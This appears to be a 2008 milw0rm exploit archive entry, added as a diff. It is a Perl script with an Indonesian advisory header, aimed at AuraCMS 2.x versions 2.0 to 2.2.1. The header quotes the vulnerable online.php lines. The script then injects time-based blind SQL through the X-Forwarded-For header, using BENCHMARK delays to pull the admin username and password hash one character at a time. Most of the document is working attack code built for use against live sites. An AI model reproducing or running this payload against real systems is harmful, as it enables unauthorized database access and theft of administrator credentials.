@@ -1,0 +1,142 @@
+#!/usr/bin/perl -w
+#
+# Indonesian Newhack Security Advisory
+# ------------------------------------
+# AuraCMS 2.x (online.php) - Remote Blind SQL Injection Exploit
+# Waktu			:  Feb 15 2008 01:00PM
+# Software		:  AuraCMS   
+# Versi			:  2.0
+#			   2.1
+#			   2.2.1
+# Vendor 		:  http://www.auracms.org/
+#
+# ------------------------------------
+# Audit Oleh 		:  NTOS-Team
+# Lokasi		:  Indonesia | http://newhack.org
+# Penjelasan		:
+# 
+# Kutu pada berkas "online.php"
+# ---//---
+# 05. $uipanda=getenv("HTTP_X_FORWARDED_FOR"); // <- Injeksi!
+# 06. $uproxyserver=getenv("HTTP_VIA");
+# 07. $uipproxy=getenv("REMOTE_ADDR");
+# 08. $uhost=gethostbyaddr($uipproxy);
+# 09. $utime=time();
+# 10. $now=$utime-600; // (in seconds)
+# --//--
+# 12. @mysql_query("delete from useronline where timevisit<$now");
+# 13. $uexists=@mysql_num_rows(@mysql_query("select id from useronline where ipproxy='$uipproxy'"));
+# 14. if ($uexists>0){
+# 15. @mysql_query("update useronline set timevisit='$utime' where ipproxy='$uipproxy'");
+# 16. } else {
+# 17. @mysql_query("insert into useronline (ipproxy,host,ipanda,proxyserver,timevisit) values('$uipproxy','$uhost','$uipanda','$uproxyserver','$utime')"); // <- Injeksi!
+# 18. }
+# ---//---
+# Injeksi dilakukan melalui manipulasi header X-Forwarded-For yang ditumpangi perintah SQL
+# referensi mengenai injeksi SQL "INSERT" -> http://www.milw0rm.com/papers/149
+#
+# => Perhatian!
+# "Exploit ini dibuat untuk pembelajaran, pengetesan dan pembuktian dari apa yang kami pelajari"
+# Segela penyalahgunaan dan kerusakan yang diakibat dari exploit ini bukan tanggung jawab kami
+# 
+# =>Newhack Technology, OpenSource & Security
+# ~ NTOS-Team->[fl3xu5,opt1lc] ~   
+use IO::Socket;
+use strict;
+
+if(!$ARGV[1]){ 
+print "\n  |-------------------------------------------------------|";
+print "\n  |            Indonesian Newhack Technology              |"; 
+print "\n  |-------------------------------------------------------|";
+print "\n  |  AuraCMS 2.x (online.php) Remote Blind SQL Injection  |";
+print "\n  |                 Coded by NTOS-Team                    |";
+print "\n  |-------------------------------------------------------|";
+print "\n[!] "; 
+print "\n[!] Exploit Berhasil jika magic_quotes_gpc = off pada server";
+print "\n[!] Penggunaan : perl aura2x-bsqli.pl [Site] [Path] [bencmark_delay]";
+print "\n[!] Contoh     : perl aura2x-bsqli.pl localhost /auracms2.x/ 2500000";
+print "\n[!] ";
+print "\n";
+exit;
+}
+
+my $delay	= "2000000";
+my $host       	= $ARGV[0];
+my $dir         = $ARGV[1];
+if ($ARGV[2]) { 
+	$delay = $ARGV[2]; 
+	}
+
+print "\nTarget url : ".$host.$dir."\n\n";
+$host =~ s/(http:\/\/)//;
+
+my @array = ("user","password");
+
+print "=> Mencoba mencari satu per satu aksara yang tepat - Sabar ya.... ;)\n\n";
+
+sleep(1);
+
+&blindsql();
+
+sub blindsql() {
+	my $x 		= "";
+	my $i		= "";
+	my $string	= "";
+	my $res		= "1";
+	for ( $x=0; $x<=$#array; $x++ ) {
+		my $j = 1;
+		$res  = 1;
+		while ($res) {
+			for ($i=32;$i<=127;$i++) {
+				$res = 0;
+				if ( $x eq 1 ) {
+					next if ( $i < 48 );
+					next if ( ( $i > 57 ) and ( $i < 97 ) );
+					next if ( $i > 102 );
+				}
+				my $injeksi  = "$i' AND IF(ASCII(SUBSTRING((SELECT ".$array[$x]." FROM useraura LIMIT 1),$j,1))=$i,BENCHMARK(".$delay.",MD5('X')),0) ,'$i','$i')/*";
+							
+				my $mulai = time();
+				my $req = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$host", PeerPort => "80") || die "Error - Koneksi Gagal\n\n";
+				print $req "GET ".$dir."index.php?pilih=stat&mod=yes HTTP/1.1\r\n";
+				print $req "Host: $host\r\n";
+				print $req "X-Forwarded-For: ".$injeksi."\r\n";
+			 	print $req "Keep-Alive: 300\r\n";
+			    	print $req "Connection: Keep-Alive\r\n";
+        			print $req "Cache-Control: no-cache\r\n";
+        			print $req "Connection: close\r\n\r\n";
+				while (my $result = <$req>) {
+					if ( $result =~ /404 Not Found/ ) {
+					printf "\n\nFile not found.\n\n";
+					print "\n\n$result\n\n";
+					exit;
+				}
+				if ( $result =~ /400 Bad Request/ ) {
+					printf "\n\nBad request.\n\n";
+					print "\n\n$result\n\n";
+					exit;
+				}
+			}
+			my $akhir = time();
+			my $waktuproses = $akhir - $mulai;
+				if ( $waktuproses > 4 ) {
+				$string .= chr($i);
+				print "\n\tMendapatkan Aksara : ".chr($i)."\n\n";
+				$res = 1;
+				last;
+			}
+			print "\tMencoba Aksara : ".chr($i)."\n";
+		}
+		$j++;
+		if ( !$res ) {
+			$array[$x] = $string;
+			$string = "";
+		}
+	}
+}
+print "\n----------------------\n";
+print "Admin username : $array[0]\n";
+print "Admin password : $array[1]\n\n";
+}
+
+# milw0rm.com [2008-03-14]
